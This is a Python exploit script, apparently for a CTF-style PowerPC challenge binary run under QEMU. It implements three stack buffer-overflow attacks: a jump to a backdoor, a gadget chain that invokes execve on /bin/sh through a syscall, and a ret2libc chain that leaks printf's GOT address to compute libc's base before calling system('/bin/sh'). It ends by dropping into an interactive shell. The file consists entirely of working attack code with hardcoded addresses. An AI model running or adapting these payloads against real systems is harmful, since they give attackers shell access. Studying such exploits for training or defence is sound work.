from pwncli import *  # type: ignore # Add other required names explicitly

context.binary = './hello'
context.update(arch='ppc', os='linux', endian='big')

import argparse

parser = argparse.ArgumentParser(description='Exploit static binary with QEMU')
parser.add_argument('--debug', action='store_true', help='Run in debug mode')
args = parser.parse_args()

debug_flag = False

if args.debug:
    context.log_level = 'debug'
    gift.io = process(['qemu-ppc', '-g', '1234', '-L', './lib','./hello'])
    debug_flag = True
else:
    context.log_level = 'debug'
    gift.io = process(['qemu-ppc', '-L', './lib','./hello'])

gift.elf = ELF('./hello')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = ELF('./lib/lib/libc.so.6')

def ret2text():
    back_door = 0x100005A4
    payload = flat([cyclic(0x28), p32(back_door)])
    
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2syscall():
    bin_sh = 0x10000940
    lwz_3_4_5_lr_blr = 0x100005D8
    lwz_0_9_b9 = 0x100005F4
    sc = 0x10000608
    payload = flat([cyclic(0x28), 
                p32(lwz_3_4_5_lr_blr), # 2 pad
                p32(0), p32(lwz_3_4_5_lr_blr), 
                p32(bin_sh), p32(0), p32(0),
                p32(lwz_0_9_b9), 
                p32(11), p32(sc)])
  
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2libc():
    printf_plt = 0x10000850
    printf_got = 0x1001FFE8
    start_addr = 0x100007E8
    lwz_3_4_5_lr_blr = 0x100005D8
    lwz_0_9_b9 = 0x100005F4
    lwz_13_lr_b13 = 0x1000060C
    payload_1 = flat([
        cyclic(0x28),
        p32(lwz_3_4_5_lr_blr),
        p32(0), p32(lwz_3_4_5_lr_blr),
        p32(printf_got),
        p32(0),           # a0
        p32(0),           # a1
        p32(lwz_13_lr_b13),
        p32(printf_plt),  # t0
        p32(start_addr)   # ra Return to _start
    ])
    if debug_flag: pause()
    sa("Enter a string: ", payload_1)
    ru("\n")
    printf_addr = u32(r(4))
    libc.address = printf_addr - libc.sym['printf']
    log.success(f"printf address: {hex(printf_addr)}")
    log.success(f"libc base address: {hex(libc.address)}")
    log.success(f"system address: {hex(libc.sym['system'])}")
    log.success(f"/bin/sh address: {hex(next(libc.search(b'/bin/sh\x00')))}")
    if debug_flag: pause()
    payload_2 = flat([
        cyclic(0x28),
        p32(lwz_3_4_5_lr_blr),
        p32(0), p32(lwz_3_4_5_lr_blr), 
        p32(next(libc.search(b'/bin/sh\x00'))),  # a0
        p32(0),
        p32(0),
        p32(libc.sym['system']),  # ra
    ])
    sa("Enter a string: ", payload_2)
    if debug_flag: pause()
    ru("\n")

if __name__ == "__main__":
    ret2libc()
    gift.io.interactive()